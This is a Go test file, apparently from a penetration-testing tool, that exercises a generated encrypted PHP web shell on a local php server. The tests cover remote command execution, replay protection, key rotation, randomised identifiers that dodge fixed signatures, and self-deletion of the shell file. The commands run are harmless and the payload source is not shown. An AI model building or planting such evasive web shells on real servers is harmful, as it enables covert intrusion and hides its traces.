package scanner

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestShellV2PHPRuntime executes the generated PHP payload under a real
// `php -S` process. It is the only test that proves the PHP implementation of
// the wire protocol (token layout, AAD, replay cache, key rotation) actually
// interoperates with the Go client, rather than with a Go mock of itself.
func TestShellV2PHPRuntime(t *testing.T) {
	php, err := exec.LookPath("php")
	if err != nil {
		t.Skip("php CLI not installed")
	}
	if testing.Short() {
		t.Skip("skipping runtime shell test in -short mode")
	}
	key, err := GenerateShellKey()
	if err != nil {
		t.Fatal(err)
	}
	carrier, err := GenerateShellCarrier()
	if err != nil {
		t.Fatal(err)
	}
	payload, err := BuildShellPayloadV2("php", key, carrier)
	if err != nil {
		t.Fatal(err)
	}

	dir := t.TempDir()
	shellPath := filepath.Join(dir, "shell.php")
	if err := os.WriteFile(shellPath, []byte(payload.Content), 0o600); err != nil {
		t.Fatal(err)
	}

	port := freeLocalPort(t)
	var logs bytes.Buffer
	cmd := exec.Command(php, "-S", fmt.Sprintf("127.0.0.1:%d", port), "-t", dir)
	cmd.Stdout = &logs
	cmd.Stderr = &logs
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = cmd.Process.Kill()
		_, _ = cmd.Process.Wait()
		if t.Failed() {
			t.Logf("php -S output:\n%s", logs.String())
		}
	})
	waitTCP(t, fmt.Sprintf("127.0.0.1:%d", port))

	url := fmt.Sprintf("http://127.0.0.1:%d/shell.php", port)
	client := NewDeepClient(5 * time.Second)
	alive, note := CheckShellAlive(context.Background(), client, url, payload)
	if !alive {
		t.Fatalf("alive check failed: %s", note)
	}
	out, err := RunShellCommand(context.Background(), client, url, payload, "printf 'jingwei-v2-ok'")
	if err != nil {
		t.Fatalf("run command: %v", err)
	}
	if out != "jingwei-v2-ok" {
		t.Fatalf("command output = %q", out)
	}
	big, err := RunShellCommand(context.Background(), client, url, payload, "yes A | head -c 4096")
	if err != nil {
		t.Fatalf("run large command: %v", err)
	}
	if len(big) != 4096 || !strings.Contains(big, "A") {
		t.Fatalf("large output was corrupted or not decompressed: len=%d", len(big))
	}
	source, err := os.ReadFile(shellPath)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(source, []byte("function jw_")) || bytes.Contains(source, []byte("$jw")) {
		t.Fatal("deployed shell still uses fixed identifiers")
	}

	// Status/command output must never carry the embedded key.
	if strings.Contains(out, EncodeShellKey(key)) {
		t.Fatal("command output leaked the shell key")
	}

	// Replaying a token the shell already accepted must 404.
	req, err := payload.v2Request(url, shellWirePing())
	if err != nil {
		t.Fatal(err)
	}
	first := client.Do(context.Background(), req)
	replay := client.Do(context.Background(), req)
	if first.StatusCode != 200 {
		t.Fatalf("first ping status = %d", first.StatusCode)
	}
	if replay.StatusCode != 404 {
		t.Fatalf("replayed token status = %d, want 404", replay.StatusCode)
	}

	newKey, err := GenerateShellKey()
	if err != nil {
		t.Fatal(err)
	}
	if err := RotateShellKey(context.Background(), client, url, payload, newKey); err != nil {
		t.Fatalf("rotate key: %v", err)
	}
	old := payload
	rotated := payload
	rotated.Key = newKey
	if out, err = RunShellCommand(context.Background(), client, url, rotated, "printf 'rotated-ok'"); err != nil || out != "rotated-ok" {
		t.Fatalf("command after rotation = %q, %v", out, err)
	}
	if _, err := RunShellCommand(context.Background(), client, url, old, "printf 'old-key'"); err == nil {
		t.Fatal("old key still accepted after rotation")
	}
	source, err = os.ReadFile(shellPath)
	if err != nil {
		t.Fatal(err)
	}
	// The PHP template embeds the key as standard base64.
	embedded := func(k []byte) string { return base64.StdEncoding.EncodeToString(k) }
	if bytes.Contains(source, []byte(embedded(key))) {
		t.Fatal("shell source still embeds the rotated-out key")
	}
	if !bytes.Contains(source, []byte(embedded(newKey))) {
		t.Fatal("shell source does not embed the rotated key")
	}
}

func TestShellV2PHPSelfDeleteRuntime(t *testing.T) {
	php, err := exec.LookPath("php")
	if err != nil {
		t.Skip("php CLI not installed")
	}
	if testing.Short() {
		t.Skip("skipping runtime shell test in -short mode")
	}
	key, err := GenerateShellKey()
	if err != nil {
		t.Fatal(err)
	}
	carrier, err := GenerateShellCarrier()
	if err != nil {
		t.Fatal(err)
	}
	payload, err := BuildShellPayloadV2("php", key, carrier)
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	shellPath := filepath.Join(dir, "selfdel.php")
	if err := os.WriteFile(shellPath, []byte(payload.Content), 0o600); err != nil {
		t.Fatal(err)
	}
	port := freeLocalPort(t)
	cmd := exec.Command(php, "-S", fmt.Sprintf("127.0.0.1:%d", port), "-t", dir)
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = cmd.Process.Kill()
		_, _ = cmd.Process.Wait()
	})
	waitTCP(t, fmt.Sprintf("127.0.0.1:%d", port))

	url := fmt.Sprintf("http://127.0.0.1:%d/selfdel.php", port)
	client := NewDeepClient(5 * time.Second)
	if alive, note := CheckShellAlive(context.Background(), client, url, payload); !alive {
		t.Fatalf("alive check failed: %s", note)
	}
	if gone, _ := VerifyShellRemoved(context.Background(), client, url, payload); gone {
		t.Fatal("shell reported gone before self-delete")
	}
	ack, err := DeleteShellSelf(context.Background(), client, url, payload)
	if err != nil {
		t.Fatalf("self-delete: %v", err)
	}
	if ack != ShellSelfDeleteOK {
		t.Fatalf("self-delete ack = %q", ack)
	}
	if _, err := os.Stat(shellPath); !os.IsNotExist(err) {
		t.Fatalf("shell file survived self-delete: %v", err)
	}
	gone, note := VerifyShellRemoved(context.Background(), client, url, payload)
	if !gone {
		t.Fatalf("shell still considered present: %s", note)
	}
	if _, err := RunShellCommand(context.Background(), client, url, payload, "id"); err == nil {
		t.Fatal("deleted shell still executes commands")
	}
	if _, err := DeleteShellSelf(context.Background(), client, url,
		ShellPayload{Protocol: ShellProtocolLegacy, Password: "x"}); err == nil {
		t.Fatal("legacy payload must be rejected")
	}
}

func freeLocalPort(t *testing.T) int {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	port := l.Addr().(*net.TCPAddr).Port
	_ = l.Close()
	return port
}

func waitTCP(t *testing.T, addr string) {
	t.Helper()
	deadline := time.Now().Add(8 * time.Second)
	for time.Now().Before(deadline) {
		conn, err := net.DialTimeout("tcp", addr, 200*time.Millisecond)
		if err == nil {
			_ = conn.Close()
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("php server did not start on %s", addr)
}
